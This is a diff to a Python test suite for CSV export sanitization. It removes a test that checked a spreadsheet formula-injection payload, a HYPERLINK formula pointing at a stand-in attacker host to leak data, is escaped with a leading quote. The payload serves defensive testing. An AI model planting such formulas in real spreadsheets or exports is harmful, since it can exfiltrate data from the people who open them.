@@ -37,15 +37,6 @@ class TestExportCsvSanitization:
             # stripped, so a leading "'" means our sanitizer ran.
             assert row["name"] == "'" + payload
 
-    def test_raw_file_does_not_contain_bare_formula_at_line_start(self, tmp_path):
-        data = [{"name": '=HYPERLINK("https://attacker.example/leak","x")'}]
-        filepath = export_csv(data, tmp_path / "out.csv")
-
-        raw = filepath.read_text(encoding="utf-8")
-        # The dangerous cell must not start a CSV field with '=' after
-        # sanitization - it should be prefixed with a quote marker.
-        assert "'=HYPERLINK" in raw
-
     def test_safe_values_are_untouched(self, tmp_path):
         data = [{"name": "Regular Product Name", "price": "19.99", "count": 5}]
         filepath = export_csv(data, tmp_path / "out.csv")
